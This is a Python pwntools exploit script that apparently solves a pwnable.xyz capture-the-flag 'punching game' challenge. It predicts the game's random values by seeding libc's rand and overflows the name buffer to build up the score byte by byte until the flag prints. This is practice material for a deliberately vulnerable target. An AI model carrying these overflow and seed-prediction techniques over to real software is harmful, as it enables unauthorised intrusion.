from pwn import *
import ctypes

LOCAL = False


# brute force random seed

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        r = remote('svc.pwnable.xyz', 30024)

    sla = r.sendlineafter
    sa = r.sendafter

    sla('Let\'s play a punching game? [Y/n] : ', 'Y')
    sa('Name: ', 'A' * 0x2c)
    sla('> ', '2')  # select saitama

    libc = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
    libc.srand(0x7f) # guess game_t

    sla('gimmi pawa> ', str(libc.rand()))

    if b'draw' in r.recvn(4):
        break
    else:
        r.close()

sla('Save? [N/y]', 'N')


# print flag

def Score():
    sla('gimmi pawa> ', str(libc.rand() + 1))

def Name(name):
    sla('gimmi pawa> ', str(libc.rand()))
    sa('Save? [N/y]', 'y')
    sa('Name: ', name)

# ex) Fill(4): 0x00010101 -> 0x01010101
def Fill(byte):
    Name('A' * 0x2c + '\xff' * (byte - 1))
    Score()
    Score()
    if byte > 2:
        for sub_byte in range(2, byte):
            Fill(sub_byte)

Score()
for byte in range(2, 9):
    Fill(byte)

sla('gimmi pawa> ', str(libc.rand() - 1)) # print name + score + flag


r.interactive()